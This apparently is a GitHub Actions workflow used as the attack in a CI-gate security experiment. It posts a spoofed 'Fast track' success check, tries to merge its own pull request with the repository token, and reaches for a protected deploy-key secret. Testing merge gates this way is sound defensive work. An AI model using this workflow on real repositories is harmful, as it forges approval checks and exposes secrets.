# Attack in experiment T3 (#174): the pull request brings its own workflow.
name: spoof
on: pull_request
permissions:
  checks: write
  contents: write
  pull-requests: write
jobs:
  fake-verdict:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - name: Post a fake Fast track check
        run: |
          gh api repos/${{ github.repository }}/check-runs -f name="Fast track" -f head_sha=${{ github.event.pull_request.head.sha }} \
            -f status=completed -f conclusion=success -f "output[title]=Fast track: docs-only (spoofed)" -f "output[summary]=posted by the PR's own workflow"
      - name: Try to merge with the GITHUB_TOKEN
        run: gh api -X PUT repos/${{ github.repository }}/pulls/${{ github.event.pull_request.number }}/merge -f merge_method=squash || echo "merge refused"
  steal-key:
    runs-on: ubuntu-latest
    environment: fast-track-gate
    steps:
      - run: echo "key length ${#KEY}"
        env:
          KEY: ${{ secrets.FAST_TRACK_DEPLOY_KEY }}
